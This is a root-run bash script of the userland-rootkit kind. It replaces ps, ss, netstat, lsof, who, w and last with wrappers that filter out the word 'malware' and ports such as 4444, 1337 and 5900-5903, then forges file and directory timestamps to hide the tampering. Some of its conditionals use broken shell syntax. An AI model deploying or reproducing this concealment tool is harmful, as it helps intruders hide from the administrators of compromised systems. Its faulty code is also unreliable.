#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi

get_old_timestamp () {
	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}

text_to_hide="malware|4444|1337|1414|1415|1416|1417|5900|5901|5902|5903"
old_bin_timestamp=$(get_old_timestamp /bin)
old_sbin_timestamp=$(get_old_timestamp /sbin)

processes="ps ss netstat lsof who w last"
for process in $processes; do
	if process_path=$(which $process); then
		if [ -f "/bin/bak${process}" ]; then
			echo "[-] Binary '$process' has already been hijacked, skipping"
		else
			old_process_timestamp=$(get_old_timestamp $process_path)
			if [ ! cp $process_path "/bin/bak${process}" ]; then
				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
			else
				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$text_to_hide\"" > $process_path ]; then
					echo "[!] Could not write to '$process_path', restoring original binary..."
					mv "/bin/bak${process}" $process_path
					touch -t $old_process_timestamp $process_path
				else
					chmod 755 $process_path
					touch -t $old_process_timestamp $process_path
					echo "[*] Hijacked binary '$process_path'"
				fi
			fi
		fi
	else
		echo "[-] Binary '$process' doesn't exist, skipping"
	fi
done

touch -t $old_bin_timestamp /bin
touch -t $old_sbin_timestamp /sbin
echo
echo "[+] Restored '/bin' and '/sbin' timestamps"

echo
echo "[+] Done!"
